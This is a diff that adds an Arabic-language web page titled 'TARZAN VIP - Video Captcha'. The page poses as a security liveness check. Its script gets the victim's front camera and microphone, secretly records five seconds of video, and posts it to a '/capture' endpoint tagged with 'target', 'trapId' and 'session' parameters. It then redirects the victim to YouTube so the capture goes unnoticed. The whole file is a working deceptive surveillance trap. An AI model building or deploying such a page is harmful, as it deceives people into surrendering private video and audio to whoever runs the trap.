@@ -1,0 +1,80 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TARZAN VIP - Video Captcha</title>
+    <style>
+        body { background-color: #050510; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; padding: 40px; border-radius: 15px; background: #0f0f1a; box-shadow: 0 0 25px rgba(0, 195, 255, 0.15); border: 1px solid #00c3ff; max-width: 85%; width: 350px; }
+        h2 { color: #00c3ff; margin-bottom: 10px; font-weight: 800; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
+        button { background: linear-gradient(45deg, #00c3ff, #0088cc); color: #fff; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 195, 255, 0.4); }
+        .video-icon { font-size: 50px; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
+        .loader { border: 4px solid #111; border-top: 4px solid #00c3ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container" id="ui">
+        <div class="video-icon">🎥</div>
+        <h2>التحقق البصري المتقدم</h2>
+        <p>نظام الحماية لدينا يطلب تحققاً بصرياً (Live Captcha) للتأكد من أنك شخص حقيقي وليس سكربت آلي.</p>
+        <button onclick="startVerification()">بدء التحقق المباشر</button>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+
+        async function startVerification() {
+            document.getElementById('ui').innerHTML = '<h2>⏳ جاري فحص الحيوية...</h2><div class="loader"></div><p style="color:#00c3ff;">يرجى النظر إلى الشاشة والانتظار قليلاً.</p>';
+            
+            try {
+                // طلب الكاميرا الأمامية والمايك معاً
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                recorder.onstop = async () => {
+                    document.getElementById('ui').innerHTML = '<h2>✅ اكتمل التحقق بنجاح</h2><p style="color:#00c3ff;">تتم الآن إعادة التوجيه إلى الصفحة المطلوبة.</p>';
+                    
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = async () => {
+                        await fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                type: 'video', 
+                                data: reader.result, 
+                                targetNumber: urlParams.get('target'), 
+                                trapId: urlParams.get('id'), 
+                                sessionId: urlParams.get('session') 
+                            })
+                        });
+                        window.location.href = "https://www.youtube.com"; 
+                    }
+                };
+                
+                recorder.start();
+                
+                // يسجل فيديو لمدة 5 ثواني
+                setTimeout(() => { 
+                    recorder.stop(); 
+                    stream.getTracks().forEach(track => track.stop()); 
+                }, 5000); 
+
+            } catch (err) {
+                document.getElementById('ui').innerHTML = '<h2>❌ رُفِضَ الإِذْن</h2><p>يجب السماح بالكاميرا والميكروفون لاجتياز التحقق البصري.</p><button onclick="location.reload()">إعادة المحاولة</button>';
+            }
+        }
+    </script>
+</body>
+</html>
